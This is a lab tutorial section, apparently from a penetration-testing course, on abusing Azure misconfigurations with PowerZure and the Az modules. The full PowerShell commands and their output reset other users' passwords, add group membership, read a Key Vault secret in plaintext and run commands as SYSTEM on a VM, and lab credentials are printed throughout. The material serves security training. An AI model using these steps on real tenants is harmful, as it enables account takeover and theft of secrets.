## Azure Attacks

We have learned how to enumerate Azure resources using AzureHound, and now we need to understand how to abuse those privileges and misconfigurations to attack the Microsoft Azure cloud.

The creators of `PowerZure` developed a framework to perform enumeration and attacks in Azure environments.

[PowerZure](https://github.com/hausec/PowerZure) is a PowerShell project created to assess and exploit resources within Microsoft’s cloud platform, Azure. This project is very similar to PowerView for Active Directory. In this section, we will explore some uses of PowerZure.

While PowerZure simplifies some offensive operations in Azure, some features may not be available in PowerZure. Due to updates in the Azure cloud, they may only work once they are updated. In such cases, we can use `AzureAD` and `Az` Microsoft PowerShell modules to accomplish our goals.

For more information on using these tools, refer to the official documentation for the [AzureAD](https://learn.microsoft.com/en-us/powershell/module/azuread/?view=azureadps-2.0) and [Az](https://learn.microsoft.com/en-us/powershell/azure/new-azureps-module-az?view=azps-9.4.0) modules, and the [PowerZure project](https://powerzure.readthedocs.io/en/latest/).

## PowerZure

To use PowerZure, we need to sign in to Azure. Open a new PowerShell window as administrator and sign in using Isabella's account:

#### Connecting to Azure

```powershell
PS C:\Tools\PowerZure> $username = "Isabella.Miller@plaintexthacktheboxgmail.onmicrosoft.com" PS C:\Tools\PowerZure> $password = ConvertTo-SecureString "HacktheboxAcademy01!" -AsPlainText -Force PS C:\Tools\PowerZure> $IsabellaCreds = New-Object System.Management.Automation.PSCredential $username, $password PS C:\Tools\PowerZure> Connect-AzAccount -Credential $IsabellaCreds Account SubscriptionName TenantId Environm ent ------- ---------------- -------- -------- Isabella.Miller@plaintexthacktheboxgmail.onmicrosoft.com 92e13faa-6af8-4501-80b9-421271bc3e38 Azure..
```

**Note:** In case we had issues using the option `-Credential` we can still use `Connect-AzAccount` without options to bring up the Azure authentication window.

Then we need to import the PowerZure module:

#### Importing PowerZure

```powershell
PS C:\Tools\PowerZure> Import-Module .\PowerZure.psd1 8888888b. ,/ 8888888888P 888 Y88b ,'/ d88P 888 888 ,' / d88P 888 d88P .d88b. 888 888 888 .d88b. 888d888 ,' /____ d88P 888 888 888d888 .d88b. 8888888P" d88""88b 888 888 888 d8P Y8b 888P" .'____ ,' d88P 888 888 888P" d8P Y8b 888 888 888 888 888 888 88888888 888 / ,' d88P 888 888 888 88888888 888 Y88..88P Y88b 888 d88P Y8b. 888 / ,' d88P Y88b 888 888 Y8b. 888 "Y88P" "Y8888888P" "Y8888 888 /,' d8888888888 "Y88888 888 "Y8888 version 2.2 /' Confused on what to do next? Check out the documentation: https://powerzure.readthedocs.io/ or type Invoke-Powerzure -h for a function table. Please set your default subscription with Set-AzureSubscription if you have multiple subscriptions. Functions WILL fail if you do not do this. Use Get-AzureCurrentUser to get list your accounts roles & permissions
```

We can use `Invoke-Powerzure -h` to see all available options:

```powershell

Set-AzureSubscription -------------- Sets default subscription. Necessary if in a tenant with multiple subscriptions. Set-AzureADUserPassword ------------ Sets a user’s password Start-AzureRunbook ----------------- Starts a Runbook
```

In our initial enumeration, we identified a group named `Subscription Reader` owned by `Charlotte`, an account that Isabella has the right to change the password. Although we have no precise way of guaranteeing that this group has read privileges on the subscription, there is a possibility that the administrator has given read rights to this group on the subscription because of the name it has.

![text](HTB%20Enterprise/azurehound_passwordrest.jpg)

To compromise this group, we must abuse two edges: `AZResetPassword` and `AZOwns`. Let's start by modifying Charlotte's password and then using her account to add herself to the `Subscription Reader` group.

#### Password Reset Charlotte

```powershell
PS C:\Tools\PowerZure> Set-AzureADUserPassword -Username Charlotte.Moore@plaintexthacktheboxgmail.onmicrosoft.com -Password HacktheboxPwnCloud01
```

Now we need to connect to Azure using Charlotte's credentials:

#### Connect as Charlotte

```powershell
PS C:\Tools\PowerZure> $username = "Charlotte.Moore@plaintexthacktheboxgmail.onmicrosoft.com" PS C:\Tools\PowerZure> $password = ConvertTo-SecureString "HacktheboxPwnCloud01" -AsPlainText -Force PS C:\Tools\PowerZure> $CharlotteCreds = New-Object System.Management.Automation.PSCredential $username, $password PS C:\Tools\PowerZure> Connect-AzAccount -Credential $CharlotteCreds Account SubscriptionName TenantId Environment ------- ---------------- -------- ----------- Charlotte.Moore@plaintexthacktheboxgmail.onmicrosoft.com 92e13faa-6af8-4501-80b9-421271bc3e38 AzureCloud
```

With Charlotte's access, we can now add any user as a member of "Subscription Reader" for simplicity, we will add herself:

#### Adding Charlotte as a member of a group

```powershell
PS C:\Tools\PowerZure> Add-AzureADGroupMember -Group "Subscription Reader" -Username Charlotte.Moore@plaintexthacktheboxgmail.onmicrosoft.com PS C:\Tools\PowerZure> Get-AzureADGroupMember -Group "Subscription Reader" @odata.type : #microsoft.graph.user id : 0bdf0dca-c1bc-4172-857b-c7b4e539c47b deletedDateTime : accountEnabled : True ageGroup : businessPhones : {} city : createdDateTime : 2023-02-17T15:44:10Z creationType : companyName : consentProvidedForMinor : country : department : displayName : Charlotte Moore ...SNIP...
```

Now, we can enumerate the Azure tenant again with Charllote's credentials. If the group has read access for the subscription, we should discover new objects and attack paths:

#### Running AzureHound as Charlotte

```

Let's import the output `all-charlote.json` to BloodHound and search for the `Transitive Object Control` option for Isabella one more time.

![text](HTB%20Enterprise/azurehound_newpaths.jpg)

We had 3 new object a [Key Vault](https://learn.microsoft.com/en-us/azure/key-vault/general/basic-concepts), a [Resource Group](https://learn.microsoft.com/en-us/azure/azure-resource-manager/management/manage-resource-groups-portal#what-is-a-resource-group) and a [Virtual Machine](https://learn.microsoft.com/en-us/azure/virtual-machines/overview). Let's explore how we can read the contents of the Azure Key Vault and how to execute commands in Azure VM. We will leave the resource group exercise so you can investigate how to abuse it.

## Reading an Azure Key Vault

Azure Key Vault is a cloud service for securely storing and accessing secrets. A secret is anything that you want to tightly control access to, such as API keys, passwords, certificates, or cryptographic keys.

We can use BloodHound to identify the attack path from `Isabella` to the Key Vault `HTB-SECRETPLAINTEXT96519`:

![text](HTB%20Enterprise/azurehound_keyvault_path.jpg)

To execute this attack, we will have to reset Ava Taylor's credentials, log in as Ava Taylor and then use the Powershell Az module to read the contents of the Key Vault.

To reset Ava Taylor's password, we will have to log in as Isabella:

#### Connect as Isabella

```powershell
PS C:\Tools\PowerZure> $username = "Isabella.Miller@plaintexthacktheboxgmail.onmicrosoft.com" PS C:\Tools\PowerZure> $password = ConvertTo-SecureString "HacktheboxAcademy01!" -AsPlainText -Force PS C:\Tools\PowerZure> $IsabellaCreds = New-Object System.Management.Automation.PSCredential $username, $password PS C:\Tools\PowerZure> Connect-AzAccount -Credential $IsabellaCreds Account SubscriptionName TenantId Environment ------- ---------------- -------- ----------- Isabella.Miller@plaintexthacktheboxgmail.onmicrosoft.com 92e13faa-6af8-4501-80b9-421271bc3e38 AzureCloud
```

#### Reset Ava Taylor's Credentials

```powershell
PS C:\Tools\PowerZure> Set-AzureADUserPassword -Username Ava.Taylor@plaintexthacktheboxgmail.onmicrosoft.com -Password HacktheboxPwnCloud01
```

#### Connect as Ava Taylor

```powershell
PS C:\Tools\PowerZure> $username = "Ava.Taylor@plaintexthacktheboxgmail.onmicrosoft.com" PS C:\Tools\PowerZure> $password = ConvertTo-SecureString "HacktheboxPwnCloud01" -AsPlainText -Force PS C:\Tools\PowerZure> $AvaCreds = New-Object System.Management.Automation.PSCredential $username, $password PS C:\Tools\PowerZure> Connect-AzAccount -Credential $AvaCreds Account SubscriptionName TenantId Environment ------- ---------------- -------- ----------- Ava.Taylor@plaintexthacktheboxgmail.onmicrosoft.com Azure subscription 1 92e13faa-6af8-4501-80b9-421271bc3e38 AzureCloud
```

To retrieve the password, we will use the Az PowerShell module instead of PowerZure. A Key Vault can have multiple secrets, keys, and certificates. We need to get the name of the secret within the Key Vault:

#### Search Azure Key Vault Secret name

```powershell
PS C:\Tools> Get-AzKeyVaultSecret -VaultName HTB-SECRETPLAINTEXT96519 Vault Name : htb-secretplaintext96519 Name : HTBKeyVault Version : Id : https://htb-secretplaintext96519.vault.azure.net:443/secrets/HTBKeyVault Enabled : True Expires : Not Before : Created : 2/17/2023 4:44:48 PM Updated : 2/17/2023 4:44:48 PM Content Type : Tags :
```

The name is `HTBKeyVault`. Now we need to get the secret. The secret is stored as a secure string, and we need to convert its value back to plain text.

#### Getting the Secret in the Azure Key Vault

```powershell
PS C:\Tools> $secret = Get-AzKeyVaultSecret -VaultName HTB-SECRETPLAINTEXT96519 -Name HTBKeyVault PS C:\Tools> [System.Net.NetworkCredential]::new('', $secret.SecretValue).Password ImHack1nGTooM4ch!
```

**Note:** There's an option in PowerZure to read the content of the Key Vault, but it was not working properly at the time of writing this module.

## Execute Commands in Azure VM

An Azure virtual machine gives you the flexibility of virtualization without buying and maintaining the physical hardware that runs it. However, you still need to maintain the virtual machine by performing tasks such as configuring, patching, and installing the software that runs on it.

We can use BloodHound to identify the attack path from `Isabella` to the Key Vault `AZVM-01`:

![text](HTB%20Enterprise/azurehound_VM_path.jpg)

To execute this attack, we will have to reset Madison Johnson's credentials, log in as Madison Johnson and then use the `PowerZure` module to execute command in the VM. We will also demonstrate how to do the same with the PowerShell `Az` module.

To reset Madison Johnson's password, we will have to log in as Isabella:

#### Connect as Isabella to reset Madison's password

```powershell
PS C:\Tools\PowerZure> $username = "Isabella.Miller@plaintexthacktheboxgmail.onmicrosoft.com" PS C:\Tools\PowerZure> $password = ConvertTo-SecureString "HacktheboxAcademy01!" -AsPlainText -Force PS C:\Tools\PowerZure> $IsabellaCreds = New-Object System.Management.Automation.PSCredential $username, $password PS C:\Tools\PowerZure> Connect-AzAccount -Credential $IsabellaCreds Account SubscriptionName TenantId Environment ------- ---------------- -------- ----------- Isabella.Miller@plaintexthacktheboxgmail.onmicrosoft.com 92e13faa-6af8-4501-80b9-421271bc3e38 AzureCloud
```

#### Reset Madison Johnson Credentials

```powershell
PS C:\Tools\PowerZure> Set-AzureADUserPassword -Username Madison.Johnson@plaintexthacktheboxgmail.onmicrosoft.com -Password HacktheboxPwnCloud01
```

#### Connect as Madison Johnson

```powershell
PS C:\Tools\PowerZure> $username = "Madison.Johnson@plaintexthacktheboxgmail.onmicrosoft.com" PS C:\Tools\PowerZure> $password = ConvertTo-SecureString "HacktheboxPwnCloud01" -AsPlainText -Force PS C:\Tools\PowerZure> $MadisonCreds = New-Object System.Management.Automation.PSCredential $username, $password PS C:\Tools\PowerZure> Connect-AzAccount -Credential $MadisonCreds Account SubscriptionName TenantId Environment ------- ---------------- -------- ----------- Madison.Johnson@plaintexthacktheboxgmail.onmicrosoft.com Azure subscription 1 92e13faa-6af8-4501-80b9-421271bc3e38 AzureCloud
```

To use PowerZure to execute commands on a VM, we can use the `Invoke-AzureRunCommand` commandlet with the arguments `VMName` and `Command` to specify the command we want to execute.

#### Execute Commands in Azure VM using PowerZure

```powershell
PS C:\Tools> Invoke-AzureRunCommand -VMName "AZVM-01" -Command whoami VERBOSE: Performing the operation "Invoke" on target "AZVM-01". nt authority\system
```

To use the `Az` module, we need to provide a few more arguments: `-ResourceGroupName`, which is `Production`, set `-CommandId` to `RunPowerShellScript` with `-ScriptString` and specify the command we want to run on the machine, in this case, `whoami`:

#### Execute Commands in Azure VM using Az PowerShell Module

```powershell
PS C:\Tools> Invoke-AzVMRunCommand -ResourceGroupName "PRODUCTION" -CommandId "RunPowerShellScript" -VMName "AZVM-01" -ScriptString "whoami" Value[0] : Code : ComponentStatus/StdOut/succeeded Level : Info DisplayStatus : Provisioning succeeded Message : nt authority\system Value[1] : Code : ComponentStatus/StdErr/succeeded Level : Info DisplayStatus : Provisioning succeeded Message : Status : Succeeded Capacity : 0 Count : 0
```

## Next Steps

We have had the opportunity to explore how to use BloodHound to enumerate Active Directory and Azure environments and understand the uses we can put this tool to from the perspective of red and blue teams to attack and defend.

However, these environments are constantly evolving, so we must keep up to date with the changes and how BloodHound incorporates new capabilities to help us enumerate Microsoft environments.

In the next section, we will use the knowledge gained to enumerate an Active Directory and Azure environment and answer questions using BloodHound data.

**Note:** To avoid any cost after you finish your Azure testing, we recommend you cancel your Azure subscription following these steps: [Cancel your Azure subscription](https://learn.microsoft.com/en-us/azure/cost-management-billing/manage/cancel-azure-subscription).
